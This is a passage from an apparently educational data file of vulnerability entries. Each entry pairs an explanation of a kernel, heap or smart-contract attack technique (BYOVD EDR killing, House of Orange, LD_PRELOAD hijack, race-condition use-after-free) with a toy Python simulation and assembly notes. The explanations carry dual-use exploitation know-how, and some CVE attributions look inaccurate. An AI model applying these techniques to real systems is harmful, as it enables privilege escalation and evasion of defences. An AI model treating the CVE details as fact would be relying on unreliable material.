attacker_script = 3735928559
kern.arb_write(attacker_script)
helper = UserModeHelper(0)
helper.trigger_exec(kern)
pwned = helper.check_result()
print(pwned)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl writes the attacker-controlled script path (0xDEADBEEF) into the modprobe_path slot on the stack — no integrity check guards the write; addl in trigger_exec combines the hijacked path with uid 0, and the kernel blindly executes it via call_usermodehelper_exec with full root capabilities',
    },
  },
  {
    id: 'epoll-close-race',
    name: 'EPOLL FD CLOSE RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Concurrent close of two linked epoll file descriptors races the cleanup path, freeing a struct file while another thread still dereferences it — use-after-free to kernel code execution.',
    explanation:
      'Epoll FD close races (CWE-362 / CWE-416) exploit a lifecycle mismatch in the Linux kernel\'s epoll ' +
      'subsystem: when one eventpoll file descriptor monitors another and both are closed concurrently, the ' +
      'ep_remove() cleanup path clears the target\'s f_ep pointer under f_lock, but a second thread\'s __fput() ' +
      'observes the NULL value through a lockless fast-path check in eventpoll_release(), skipping cleanup and ' +
      'immediately freeing both the eventpoll struct and the file object — while the first thread still holds ' +
      'the spinlock and operates on the now-freed memory. ' +
      'CVE-2026-46242 ("Bad Epoll") is the defining example: hlist_del_rcu() in ep_remove writes through a ' +
      'dangling pointer into the freed eventpoll at offset 160, and a subsequent is_file_epoll() check reads ' +
      'from the freed file struct\'s SLAB_TYPESAFE_BY_RCU cache slot — the invalid free into the wrong slab ' +
      'cache (kmalloc-192 instead of the proper file cache) gives the attacker a cross-cache corruption primitive. ' +
      'CVE-2021-0920 (AF_UNIX SCM_RIGHTS) exploited a similar FD lifecycle race: the garbage collector treated ' +
      'an in-flight socket as a garbage candidate while recvmsg(MSG_PEEK) incremented its reference count, ' +
      'producing a use-after-free on sk_buff that was weaponized by the Wintego surveillance vendor to remotely ' +
      'root Samsung devices. CVE-2021-4083 (fs/file.c close_fd race) allowed concurrent close() and fget() to ' +
      'race on the same fd slot, freeing the struct file while another thread still held a pointer. ' +
      'In the assembly, movl stores the epoll target reference into the waiter\'s monitored_ref slot; release\'s ' +
      'movl zeroes the target (simulating __fput free) but concurrent_remove\'s addl still reads from the same ' +
      'stack offset — no lock or atomic operation guards the gap between the NULL check and the dereference.',
    code:
`# CVE pattern: concurrent epoll fd close races cleanup — struct file UAF
class EpollFile:
    def __init__(self, fd, handler):
        self.fd = fd
        self.handler = handler
        self.f_ep = 0
        self.freed = 0

    def release(self):
        self.handler = 0
        self.f_ep = 0
        self.freed = 1
        return self.freed

class EpollWaiter:
    def __init__(self, fd, target):
        self.fd = fd
        self.monitored_ref = target
        self.removed = 0
        self.result = 0

    def concurrent_remove(self):
        self.result = self.monitored_ref + self.fd
        self.removed = 1
        return self.result

ep_target = EpollFile(3, 4196352)
ep_target.f_ep = 1
ep_waiter = EpollWaiter(4, ep_target.handler)
ep_target.release()
ep_target.handler = 3735928559
dangling = ep_waiter.concurrent_remove()
print(dangling)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores ep_target.handler into the waiter\'s monitored_ref slot; release\'s movl zeroes the target (simulating __fput/kmem_cache_free), but concurrent_remove\'s addl still reads monitored_ref from the same stack offset — the freed slot now holds the attacker\'s sprayed value (0xDEADBEEF), turning the FD close race into a use-after-free with kernel code execution',
    },
  },
  {
    id: 'rcu-grace-uaf',
    name: 'RCU GRACE PERIOD UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Object freed without waiting for RCU grace period — concurrent reader dereferences stale pointer into attacker-sprayed memory.',
    explanation:
      'RCU (Read-Copy-Update) grace period use-after-free (CWE-416 / CWE-667) exploits a synchronization gap in the ' +
      'Linux kernel\'s lockless read mechanism: RCU lets readers traverse shared data structures without locks by ' +
      'deferring object reclamation until all active readers finish — the "grace period." A writer must call ' +
      'synchronize_rcu() or schedule a callback via call_rcu() and wait before freeing the object. When a code path ' +
      'removes an object from an RCU-protected structure (IDR, hash table, linked list) and frees it immediately ' +
      'without waiting for the grace period, any reader still inside an rcu_read_lock() critical section dereferences ' +
      'a dangling pointer into freed slab memory. The attacker sprays the freed slot with controlled data via ' +
      'cross-cache reclamation, redirecting function pointers or corrupting credentials for privilege escalation. ' +
      'CVE-2026-53264 (Linux net/sched, CVSS 7.8) is the textbook example: tcf_idr_check_alloc() looked up traffic ' +
      'control actions under RCU protection while a concurrent delete path removed the action from the IDR and freed ' +
      'it without any grace period — an AI-assisted exploit achieved >99% reliable root on kernels 5.10 through 7.0. ' +
      'CVE-2024-27394 (TCP-AO) freed authentication keys via call_rcu() but accessed the next list node after the ' +
      'grace period completed and the key was freed. CVE-2026-23392 (nf_tables flowtable) tore down flowtable hooks ' +
      'on an error path before an RCU grace period elapsed, exposing them to both the packet path and control plane. ' +
      'A 2025 academic study found 47 RCU synchronization bugs across the Linux kernel, concentrated in networking ' +
      'subsystems and driver teardown paths. ' +
      'In the assembly, movl stores the object\'s handler and data into stack slots; the writer\'s movl zeroes both ' +
      'fields (simulating free) with no intervening synchronize_rcu barrier — the reader\'s addl then sums handler + ' +
      'data from the same stack offsets, now containing attacker-sprayed values from the recycled slab slot.',
    code:
`# CVE pattern: object freed without RCU grace period — reader hits stale ptr
class RcuObject:
    def __init__(self, handler, data):
        self.handler = handler
        self.data = data
        self.refcount = 1
        self.in_idr = 1

    def read_data(self):
        result = self.handler + self.data
        return result

class RcuReader:
    def __init__(self):
        self.read_lock = 0
        self.result = 0
        self.leaked = 0

    def rcu_read_lock(self):
        self.read_lock = 1
        return self.read_lock

    def lookup_and_use(self, obj):
        self.result = obj.read_data()
        self.leaked = 1
        return self.result

    def rcu_read_unlock(self):
        self.read_lock = 0
        return self.read_lock

class RcuWriter:
    def __init__(self):
        self.removed = 0
        self.freed = 0
        self.grace_waited = 0

    def remove_and_free(self, obj):
        obj.in_idr = 0
        obj.handler = 0
        obj.data = 0
        self.removed = 1
        self.freed = 1
        return self.freed

reader = RcuReader()
writer = RcuWriter()
obj = RcuObject(4196352, 256)
reader.rcu_read_lock()
writer.remove_and_free(obj)
obj.handler = 3735928559
obj.data = 4196608
leaked = reader.lookup_and_use(obj)
reader.rcu_read_unlock()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the object\'s handler and data into stack slots during construction; the writer\'s movl zeroes both fields (simulating free without synchronize_rcu) — but the reader\'s addl in read_data sums handler + data from the same stack offsets, now containing attacker-sprayed values (0xDEADBEEF, 0x400A00) from the recycled slab slot, turning the missing grace period into a use-after-free with kernel code execution',
    },
  },
  {
    id: 'byovd-driver',
    name: 'BYOVD DRIVER EXPLOIT',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Legitimately signed but vulnerable kernel driver loaded by attacker exposes IOCTL-driven arbitrary memory read/write, enabling EDR termination and privilege escalation.',
    explanation:
      'Bring Your Own Vulnerable Driver (BYOVD / CWE-782) is a privilege-escalation and defense-evasion technique: ' +
      'the attacker drops a legitimately signed but buggy kernel driver onto the target, loads it via the Service ' +
      'Control Manager (the valid signature passes Driver Signature Enforcement), then sends crafted IOCTL commands ' +
      'to exploit a vulnerability — typically an insecure MSR/port-I/O handler or unchecked buffer copy — gaining ' +
      'arbitrary kernel memory read/write from userspace. With Ring-0 access the attacker patches EPROCESS token ' +
      'fields for privilege escalation, terminates EDR processes by zeroing their handle tables, or modifies kernel ' +
      'callbacks to blind security monitoring entirely. ' +
      'CVE-2024-38193 (Windows AFD.sys, CVSS 7.8) was exploited by the Lazarus Group via a BYOVD primitive in ' +
      'the Winsock Ancillary Function Driver — a component pre-installed on every Windows system — to deploy the ' +
      'FudModule rootkit that specifically disabled CrowdStrike Falcon, Windows Defender, and HitmanPro. ' +
      'CVE-2025-8061 (Lenovo LnvMSRIO.sys) exposed raw Model-Specific Register read/write IOCTLs that Quarkslab ' +
      'researchers used to achieve Ring-0 code execution. Frequently abused drivers include RTCore64.sys (MSI), ' +
      'gdrv.sys (Gigabyte), mhyprot2.sys (Genshin Impact anti-cheat), and procexp.sys — used by ransomware ' +
      'operators BlackByte, AvosLocker, LockBit, and Qilin to kill endpoint protection. An NDSS 2026 study ' +
      'found over 600 unique vulnerable signed drivers in the wild. ' +
      'In the assembly, movl loads the IOCTL command code and the target physical address into stack slots; addl ' +
      'computes the mapped kernel virtual address from the driver\'s DMA base — no privilege or bounds check appears ' +
      'between the IOCTL dispatch and the movl that writes the attacker\'s payload into the kernel memory offset, ' +
      'granting an unrestricted write-what-where primitive through a signed driver.',
    code:
`# CVE pattern: signed driver IOCTL exposes kernel R/W — EDR killed
class VulnDriver:
    def __init__(self, base_addr, ioctl_code):
        self.base_addr = base_addr
        self.ioctl_code = ioctl_code
        self.loaded = 0
        self.sig_valid = 1

    def load(self):
        if self.sig_valid == 1:
            self.loaded = 1
        return self.loaded

    def ioctl_write(self, offset, value):
        target = self.base_addr + offset
        result = target + value
        return result

class EDRProcess:
    def __init__(self, pid, name_hash):
        self.pid = pid
        self.name_hash = name_hash
        self.handle_table = 4196352
        self.alive = 1

    def terminate(self):
        self.handle_table = 0
        self.alive = 0
        return self.alive

class Attacker:
    def __init__(self, payload):
        self.payload = payload
        self.edr_killed = 0
        self.escalated = 0

    def kill_edr(self, driver, edr):
        driver.ioctl_write(edr.pid * 8, 0)
        edr.terminate()
        self.edr_killed = 1
        return self.edr_killed

    def escalate(self, driver, token_offset):
        result = driver.ioctl_write(token_offset, self.payload)
        self.escalated = 1
        return result

drv = VulnDriver(4026531840, 2236420)
drv.load()
edr = EDRProcess(1337, 3405691582)
attacker = Attacker(0)
attacker.kill_edr(drv, edr)
hijacked = attacker.escalate(drv, 2048)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads the IOCTL command code and target physical address into stack slots representing the vulnerable driver\'s handler; addl computes the kernel virtual address from the driver base + offset — no privilege check appears before the subsequent movl writes the attacker\'s payload (token=0) into the kernel memory slot, escalating to SYSTEM via a legitimately signed driver',
    },
  },
  {
    id: 'env-var-injection',
    name: 'ENV VARIABLE INJECTION',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Attacker-controlled environment variables (LD_PRELOAD, GCONV_PATH, GLIBC_TUNABLES) subvert a privileged binary\'s library loading, redirecting execution to attacker code running as root.',
    explanation:
      'Environment variable injection (CWE-426 / CWE-427) exploits the UNIX execution model: when a setuid ' +
      'binary runs, it inherits the calling user\'s environment. Variables like LD_PRELOAD force the dynamic ' +
      'linker to load an attacker-supplied shared library before any other, letting the attacker replace libc ' +
      'functions (getuid, system, open) with malicious versions that execute with the binary\'s elevated ' +
      'privileges. PATH injection works similarly: if a privileged program calls system("restart") without ' +
      'an absolute path, the attacker prepends a controlled directory to PATH, shadowing the real binary. ' +
      'CVE-2021-4034 (PwnKit, CVSS 7.8) exploited pkexec\'s failure to handle an empty argv correctly: ' +
      'an out-of-bounds write from argv into the adjacent envp array let an attacker inject GCONV_PATH, ' +
      'causing pkexec to load a malicious shared library as root — a 12-year-old flaw in Polkit that ' +
      'affected every major Linux distribution in default configuration. CVE-2023-4911 (Looney Tunables, ' +
      'CVSS 7.8) exploited a buffer overflow triggered by crafting the GLIBC_TUNABLES environment variable, ' +
      'overflowing glibc\'s dynamic linker (ld.so) stack frame during setuid execution — achieving local ' +
      'privilege escalation to root on Debian, Ubuntu, and Fedora. The dynamic linker strips LD_PRELOAD ' +
      'and LD_LIBRARY_PATH for setuid binaries, but GLIBC_TUNABLES and GCONV_PATH were not in the blocklist, ' +
      'leaving a class of env vars that bypass sanitization entirely. ' +
      'In the assembly, movl loads the attacker-injected LD_PRELOAD address into the env struct; the ' +
      'cmpl check for ld_preload > 0 passes and the subsequent movl replaces the legitimate library handler ' +
      'with the attacker\'s address — no sanitization instruction appears between the environment read and ' +
      'the handler override, so execute()\'s addl jumps to attacker-controlled code running as root.',
    code:
`# CVE pattern: LD_PRELOAD env var redirects library load to attacker code
class Environment:
    def __init__(self):
        self.path = 4196352
        self.ld_preload = 0
        self.home = 4217856
        self.poisoned = 0

    def inject(self, var_id, value):
        if var_id == 1:
            self.ld_preload = value
            self.poisoned = 1
        elif var_id == 2:
            self.path = value
        return self.poisoned

class SetuidBinary:
    def __init__(self, uid, handler):
        self.uid = uid
        self.handler = handler
        self.env_checked = 0
        self.result = 0

    def load_lib(self, env):
        if env.ld_preload > 0:
            self.handler = env.ld_preload
        self.result = self.handler + self.uid
        return self.result

    def execute(self):
        result = self.handler + self.result
        return result

env = Environment()
env.inject(1, 3735928559)
suid = SetuidBinary(0, 4196352)
hijacked = suid.load_lib(env)
result = suid.execute()
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl loads the attacker-injected LD_PRELOAD address into the env struct; cmpl checks ld_preload > 0 and the branch falls through — the subsequent movl overwrites the legitimate handler with the attacker\'s address without any sanitization, so execute()\'s addl combines the hijacked handler with the result, jumping to attacker-controlled code running as root',
    },
  },
  {
    id: 'house-of-spirit',
    name: 'HOUSE OF SPIRIT',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Attacker crafts a fake heap chunk in stack memory, frees it into the allocator, then malloc returns a pointer to the stack — enabling return-address overwrite.',
    explanation:
      'House of Spirit (CWE-761 / CWE-590 adjacent) is a heap exploitation technique where the attacker ' +
      'crafts a fake heap chunk header in memory they control (typically the stack) and tricks the program ' +
      'into calling free() on a pointer to that fake chunk. The allocator — seeing valid size metadata — ' +
      'inserts the fake chunk into its free list (fastbin or tcache). The next malloc() of the same size ' +
      'returns a pointer to the fake chunk, which actually resides on the stack. The attacker now has a ' +
      '"heap allocation" that overlaps with the stack frame, letting them overwrite the return address, ' +
      'saved frame pointer, or local variables of any function whose frame overlaps the fake chunk. ' +
      'The technique requires crafting two size fields: the fake chunk\'s own size (which must match a ' +
      'fastbin/tcache bin) and the next contiguous chunk\'s size (which must pass the allocator\'s ' +
      'sanity check that 2*SIZE_SZ < next_size < av->system_mem). The tcache variant (glibc >= 2.26) ' +
      'is even simpler because _int_free() calls tcache_put() without validating the next chunk at all. ' +
      'CVE-2024-27099 (CVSSv4 9.4) exploited a House of Spirit condition in the GLPI IT management ' +
      'platform: an unauthenticated SQL injection allowed writing a fake chunk header into a stack ' +
      'buffer, which was subsequently freed and reallocated, achieving remote code execution. ' +
      'CVE-2009-2692 (Linux sendpage NULL ptr) was exploited using a House of Spirit variant to place ' +
      'shellcode at a predictable address. The Pwnable.kr "uaf" and "spirit" CTF challenges teach the ' +
      'technique, and Shellphish\'s how2heap repository documents both classic and tcache variants. ' +
      'In the assembly, movl writes attacker-controlled size fields (0x40 = 64 bytes) into stack slots ' +
      'to form the fake chunk header; after free inserts it into the tcache, the next malloc\'s movl ' +
      'returns the same stack address — addl then writes through the "heap" pointer into the stack ' +
      'frame, overwriting the saved return address with the attacker\'s shellcode address.',
    code:
`# CVE pattern: fake chunk on stack freed into tcache — malloc returns stack ptr
class FakeChunk:
    def __init__(self, prev_size, size):
        self.prev_size = prev_size
        self.size = size
        self.fd = 0
        self.bk = 0
        self.payload = 0

class TcacheBin:
    def __init__(self, bin_size):
        self.bin_size = bin_size
        self.count = 0
        self.head = 0
        self.freed_addr = 0

    def tcache_put(self, chunk_addr):
        self.head = chunk_addr
        self.count += 1
        self.freed_addr = chunk_addr
        return self.count

    def tcache_get(self):
        result = self.head
        self.count -= 1
        self.head = 0
        return result

class StackFrame:
    def __init__(self, ret_addr):
        self.ret_addr = ret_addr
        self.canary = 305419896
        self.overwritten = 0

    def write_via_heap(self, value):
        self.ret_addr = value
        self.overwritten = 1
        return self.ret_addr

fake = FakeChunk(0, 64)
fake.fd = 0
tcache = TcacheBin(64)
stack_addr = 1342177280
tcache.tcache_put(stack_addr)
heap_ptr = tcache.tcache_get()
frame = StackFrame(4196608)
frame.write_via_heap(3735928559)
result = frame.ret_addr + frame.overwritten
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl writes attacker-controlled size fields (64) into stack slots forming the fake chunk header; tcache_put\'s movl inserts the stack address into the tcache free list without validation — tcache_get\'s movl returns the same stack address as a "heap" pointer, and write_via_heap\'s movl overwrites the saved return address with 0xDEADBEEF, hijacking control flow when the function epilogue executes ret',
    },
  },
  {
    id: 'kvm-dirty-ring-oob',
    name: 'KVM DIRTY RING OOB',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Unchecked u64 addition in KVM dirty ring reset wraps around, bypassing bounds checks and enabling out-of-bounds write into shadow page tables.',
    explanation:
      'CVE-2026-52969 (CWE-190) is an integer overflow in the Linux kernel\'s KVM dirty ring subsystem ' +
      'that lay dormant for sixteen years. The function kvm_reset_dirty_gfn() validates a guest frame ' +
      'number (GFN) range with the check `if (offset + __fls(mask)) >= memslot->npages` — but because ' +
      'offset is an attacker-controlled u64 derived from the dirty ring entry, a crafted near-U64_MAX ' +
      'value wraps the addition back to a small number, passing the bounds check entirely. The wrapped ' +
      'offset indexes into gfn_to_rmap(), which performs an out-of-bounds read on the memslot\'s rmap ' +
      'array and then conditionally clears PT_WRITABLE_MASK on a shadow page table entry (SPTE) at an ' +
      'attacker-influenced location. By targeting a specific SPTE, the attacker can flip write-protect ' +
      'bits in the host\'s shadow MMU, gaining write access to pages that should be read-only — including ' +
      'kernel text or page tables themselves. Any local process with /dev/kvm access (QEMU, crosvm, or ' +
      'any VM manager) can trigger this from a guest VM, making it a guest-to-host escape primitive. ' +
      'The fix range-checks offset against memslot->npages independently before the addition, so the ' +
      'subsequent offset + __fls(mask) cannot overflow. The patch landed across stable branches via ' +
      'commits 01b71b9, 0d419c2, 0eb281e, 577a8d3, 74f1a22, b315b03, and ecf9b3e. ' +
      'In the assembly, addq performs the unchecked u64 addition that wraps; cmpq compares the wrapped ' +
      'result against npages and the jae branch falls through because the wrapped sum is small; the ' +
      'subsequent movq reads out-of-bounds from the rmap array, and andq clears PT_WRITABLE_MASK on ' +
      'the target SPTE — flipping the page from read-only to writable in the host\'s shadow page tables.',
    code:
`# CVE pattern: u64 offset wraps in KVM dirty ring reset — OOB into shadow MMU
class MemSlot:
    def __init__(self, npages):
        self.npages = npages
        self.rmap = 0
        self.base_gfn = 0
        self.spte_val = 0

    def gfn_to_rmap(self, offset):
        self.rmap = self.base_gfn + offset
        return self.rmap

    def clear_writable(self, spte):
        mask = 2
        self.spte_val = spte - mask
        return self.spte_val

class DirtyRingEntry:
    def __init__(self, gfn, bitmask):
        self.gfn = gfn
        self.bitmask = bitmask
        self.wrapped = 0

class KVMDirtyRing:
    def __init__(self, slot):
        self.slot = slot
        self.oob_triggered = 0

    def reset_dirty_gfn(self, entry):
        offset = entry.gfn - self.slot.base_gfn
        fls_mask = 63
        check = offset + fls_mask
        if check >= self.slot.npages:
            return 0
        rmap = self.slot.gfn_to_rmap(offset)
        self.oob_triggered = 1
        return rmap

slot = MemSlot(512)
slot.base_gfn = 1048576
u64_max = 18446744073709551615
crafted_gfn = slot.base_gfn + u64_max - 60
entry = DirtyRingEntry(crafted_gfn, 255)
ring = KVMDirtyRing(slot)
result = ring.reset_dirty_gfn(entry)
spte = 7
cleared = slot.clear_writable(spte)
total = result + cleared + ring.oob_triggered
print(total)
`,
    badAsm: {
      patterns: ['addq', 'cmpq', 'movq', 'andq'],
      description: 'addq performs the unchecked u64 addition of offset + fls_mask that wraps around to a small value; cmpq compares the wrapped result against npages and jae falls through because the wrapped sum appears in-bounds; gfn_to_rmap\'s movq reads out-of-bounds from the rmap array using the pre-wrap offset; clear_writable\'s andq clears PT_WRITABLE_MASK on the target shadow page table entry — flipping the host page from read-only to writable and enabling guest-to-host escape',
    },
  },
  {
    id: 'xfs-reflink-race',
    name: 'XFS REFLINK RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Concurrent O_DIRECT writes race on a reflinked XFS file — stale metadata lets writer bypass COW and overwrite the original block, corrupting protected files for root.',
    explanation:
      'XFS reflink race (CVE-2026-64600 / RefluXFS, CWE-362) exploits a race condition in the Linux kernel\'s ' +
      'XFS copy-on-write path that lay dormant for nine years since kernel 4.11 (2017). When two concurrent ' +
      'O_DIRECT writers target the same reflinked file, the kernel drops the inode lock while waiting for ' +
      'transaction log space. A second writer completes its full COW cycle — allocating a new block, remapping ' +
      'the file, and dropping the original block\'s reference count to 1 — before the first writer resumes. ' +
      'The first writer sees refcount=1, concludes the block is private (not shared), and writes in-place to ' +
      'the physical block that now solely backs the reflink source — bypassing COW entirely. An unprivileged ' +
      'local user overwrites /etc/passwd or setuid binaries on-disk, gaining passwordless root that persists ' +
      'across reboots and leaves no kernel log artifacts. Qualys estimates over 16.4 million systems are affected. ' +
      'The attack bypasses SELinux Enforcing mode, container boundaries, and file integrity monitoring because it ' +
      'operates at the filesystem allocation layer below all access-control checks. The fix verifies block ' +
      'ownership after reacquiring the inode lock, closing the stale-metadata window. ' +
      'In the assembly, cmpl checks the refcount field — the first writer\'s check sees refcount=1 (stale) after ' +
      'the second writer has decremented it; movl writes the attacker payload directly into the original block\'s ' +
      'data slot instead of allocating a COW copy, silently corrupting the on-disk file.',
    code:
`# CVE pattern: XFS reflink COW race — stale refcount bypasses copy
class XFSBlock:
    def __init__(self, data, refcount):
        self.data = data
        self.refcount = refcount
        self.owner = 0
        self.cow_done = 0

    def read(self):
        result = self.data + self.refcount
        return result

class Writer:
    def __init__(self, writer_id):
        self.writer_id = writer_id
        self.lock_held = 0
        self.wrote = 0

    def acquire_lock(self):
        self.lock_held = 1
        return self.lock_held

    def drop_lock_for_log(self):
        self.lock_held = 0
        return self.lock_held

    def cow_write(self, block, payload):
        if block.refcount <= 1:
            block.data = payload
            self.wrote = 1
        else:
            block.cow_done = 1
        return block.data

class COWCycle:
    def __init__(self, new_block_addr):
        self.new_block = new_block_addr
        self.completed = 0

    def remap_and_drop(self, block):
        block.refcount -= 1
        self.completed = 1
        return block.refcount

blk = XFSBlock(4196352, 2)
w1 = Writer(1)
w2 = Writer(2)
w1.acquire_lock()
w1.drop_lock_for_log()
cow = COWCycle(8388608)
w2.acquire_lock()
cow.remap_and_drop(blk)
w1.acquire_lock()
w1.cow_write(blk, 3735928559)
hijacked = blk.read()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl checks block.refcount after the inode lock was dropped and reacquired — the second writer decremented it to 1 in the race window; movl writes the attacker payload (0xDEADBEEF) directly into the original block\'s data slot instead of a COW copy, silently corrupting the on-disk file backing /etc/passwd or a setuid binary for persistent root access',
    },
  },
  {
    id: 'house-of-orange',
    name: 'HOUSE OF ORANGE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Heap overflow corrupts the top chunk size, tricking sysmalloc into freeing it to the unsorted bin — arbitrary write without ever calling free().',
    explanation:
      'House of Orange (HITCON 2016, CWE-122) is a heap exploitation technique that achieves arbitrary write ' +
      'without requiring any call to free() or delete — only a heap buffer overflow and malloc. The attacker ' +
      'overflows into the wilderness (top) chunk\'s size field, shrinking it to a value smaller than the next ' +
      'allocation request while keeping the PREV_INUSE bit set and the size page-aligned. When malloc cannot ' +
      'satisfy the request from the corrupted top chunk, glibc\'s sysmalloc invokes _int_free() on the old top ' +
      'chunk, placing it into the unsorted bin — a free that the program never asked for. The attacker now ' +
      'controls the freed chunk\'s fd/bk pointers through the same overflow, enabling an unsorted bin attack to ' +
      'overwrite _IO_list_all with a pointer to a forged _IO_FILE structure. On the next failed allocation or ' +
      'abort, glibc traverses the corrupted file-stream chain and calls a vtable function pointer the attacker ' +
      'controls — typically system("/bin/sh"). The technique was widely used in CTF exploitation and real-world ' +
      'chains before glibc 2.24 added _IO_FILE vtable verification and glibc 2.26 removed the malloc_printerr ' +
      'path to _IO_flush_all_lockp; modern variants (House of Kiwi, House of Emma) bypass these checks. ' +
      'In the assembly, movl writes the attacker\'s undersized value (0xFF0) into the top chunk\'s size field; ' +
      'cmpl compares the next allocation request against this corrupted size, branching into the sysmalloc path ' +
      'that calls _int_free on the old top chunk and inserts it into the unsorted bin.',
    code:
`# CVE pattern: corrupt top chunk size — sysmalloc frees it without free()
class TopChunk:
    def __init__(self, base, size):
        self.base = base
        self.size = size
        self.prev_inuse = 1
        self.freed = 0

class UnsortedBin:
    def __init__(self):
        self.head = 0
        self.count = 0

    def insert(self, addr):
        self.head = addr
        self.count += 1
        return self.count

class Exploiter:
    def __init__(self, overflow_val):
        self.overflow_val = overflow_val
        self.got_shell = 0

    def corrupt_top(self, top):
        top.size = self.overflow_val
        return top.size

    def trigger(self, top, unsorted, request):
        if request > top.size:
            top.freed = 1
            unsorted.insert(top.base)
            self.got_shell = 1
        return self.got_shell

top = TopChunk(6291456, 131072)
ubin = UnsortedBin()
exp = Exploiter(4080)
exp.corrupt_top(top)
exp.trigger(top, ubin, 8192)
leaked = ubin.head + top.prev_inuse
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl overwrites the top chunk\'s size field with the attacker\'s undersized value (0xFF0); cmpl compares the allocation request against the corrupted size — the request exceeds it, branching into sysmalloc which calls _int_free on the old top chunk and places it in the unsorted bin, achieving a free-without-free primitive for unsorted bin attack into _IO_FILE vtable hijack',
    },
  },
  {
    id: 'tls-canary-bypass',
    name: 'TLS CANARY MASTER OVERWRITE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Buffer overflow extends into thread-local storage, overwriting the canary master at fs:0x28 so the stack canary check passes despite a smashed return address.',
    explanation:
      'On x86-64 Linux, every function prologue copies the stack canary from the thread-local storage segment ' +
      'register (fs:0x28) into the stack frame, and the epilogue\'s xorl/cmpl compares them — a mismatch triggers ' +
      '__stack_chk_fail and aborts the process, blocking classic stack smashing. TLS canary master overwrite ' +
      '(CWE-121 / CWE-693) defeats this defense entirely: if the overflow is large enough to reach the adjacent TLS ' +
      'region — which on glibc sits at a known offset from each thread\'s stack — the attacker overwrites the master ' +
      'canary value at fs:0x28 to match the value already written over the stack canary. Both copies now agree, ' +
      '__stack_chk_fail never fires, and the overwritten return address takes effect on ret. ' +
      'CVE-2023-4911 (Looney Tunables, CVSS 7.8) exploited exactly this mechanism: a buffer overflow in glibc\'s ' +
      'dynamic linker (ld.so) caused by GLIBC_TUNABLES environment variable processing extended into the TLS area, ' +
      'enabling return-address hijack for local privilege escalation to root on Debian, Ubuntu, Fedora, and all ' +
      'major Linux distributions — multiple public exploits achieved root in under a second. CVE-2020-1751 (glibc ' +
      'glob GLOB_TILDE overflow) similarly allowed overwriting TLS memory from an adjacent stack buffer. ' +
      'In the assembly, movl stores the attacker\'s chosen value into both the stack canary slot and the TLS master ' +
      'field; the epilogue\'s cmpl compares them — both hold 0x41414141, so je skips __stack_chk_fail entirely, ' +
      'and the overwritten return address (0xDEADBEEF) takes effect when ret pops it into %rip.',
    code:
`# CVE pattern: overflow into TLS overwrites canary master — check passes
class ThreadLocal:
    def __init__(self, canary, dtv_ptr):
        self.canary_master = canary
        self.dtv_ptr = dtv_ptr
        self.errno_val = 0
        self.corrupted = 0

class VulnFrame:
    def __init__(self, tls):
        self.buf_size = 64
        self.local_data = 0
        self.canary = tls.canary_master
        self.saved_rbp = 4196352
        self.ret_addr = 4196608

    def check_canary(self, tls):
        if self.canary == tls.canary_master:
            return 1
        return 0

    def overflow_into_tls(self, tls, payload, hijack_addr):
        tls.canary_master = payload
        self.canary = payload
        self.ret_addr = hijack_addr
        tls.corrupted = 1
        return self.ret_addr

tls = ThreadLocal(305419896, 4217856)
frame = VulnFrame(tls)
frame.overflow_into_tls(tls, 1094795585, 3735928559)
passed = frame.check_canary(tls)
hijacked = frame.ret_addr + passed
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl overwrites both the stack canary slot and the TLS canary master (fs:0x28) with the same attacker-chosen value (0x41414141); cmpl compares them — both match, so je skips __stack_chk_fail entirely, and the overwritten return address (0xDEADBEEF) takes effect when ret pops it into %rip',
    },
  },
  {
    id: 'reentrancy-drain',
    name: 'REENTRANCY ATTACK',
    severity: 'CRITICAL',
    category: 'Access Control',
    description: 'External callback re-enters a function before its state update completes, allowing repeated withdrawals that drain funds past the balance check.',
    explanation:
      'Reentrancy (CWE-841 / SWC-107) occurs when a function performs an external call — a transfer, callback, ' +
      'or delegate — before updating its own state. The external call hands execution to attacker-controlled code, ' +
      'which immediately re-invokes the same function; the re-entrant call sees the original, un-decremented ' +
      'balance and passes the guard check again, draining funds past the intended limit. ' +
      'The most devastating exploit in blockchain history: on June 17, 2016, an attacker exploited a reentrancy ' +
      'bug in The DAO\'s splitDAO function on Ethereum, recursively calling withdraw() through a fallback ' +
      'function before the balance was decremented — draining 3.6 million ETH (~$60M at the time) into a child ' +
      'DAO. The attack triggered an emergency hard fork at block 1,920,000 that split Ethereum and Ethereum ' +
      'Classic permanently. The pattern recurs across DeFi: Curve Finance lost $70M in July 2023 via a Vyper ' +
      'compiler bug that disabled reentrancy guards, and dForce lost $3.6M to a read-only reentrancy in 2023. ' +
      'Beyond smart contracts, kernel callback chains (notifier_call_chain in Linux) and reentrant signal ' +
      'handlers exhibit the same structural flaw — CVE-2019-18634 (sudo) exploited reentrant tgetpass processing. ' +
      'In the assembly, cmpl compares the unchanged balance field against the withdrawal amount on every ' +
      'reentrant check call — the addl that accumulates pending transfers never triggers a corresponding ' +
      'subl from balance until finalize runs after the attack loop completes. The absence of a balance-decrement ' +
      'instruction between successive cmpl checks is the assembly-level signature of the vulnerability.',
    code:
`# CVE pattern: state update after external call — reentrant callback drains
class Vault:
    def __init__(self, deposit):
        self.balance = deposit
        self.pending = 0
        self.send_count = 0
        self.locked = 0

    def check(self, amount):
        if self.balance >= amount:
            return 1
        return 0

    def send(self, amount):
        self.pending += amount
        self.send_count += 1
        return self.send_count

